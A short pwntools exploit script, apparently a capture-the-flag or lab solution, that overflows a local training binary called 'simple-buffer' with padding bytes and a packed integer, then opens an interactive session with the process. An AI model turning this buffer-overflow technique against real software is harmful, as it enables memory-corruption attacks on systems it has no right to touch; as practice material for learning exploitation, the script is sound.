#! /bin/python3

from pwn import *

context.binary = './simple-buffer'

io = process(['./simple-buffer', '19520982'])

e = ELF('./simple-buffer')

exploit_payload = b'A' * (0x24 - 0xc) + p32(int('19520982'))
print(exploit_payload)

io.sendline(exploit_payload)
io.interactive()
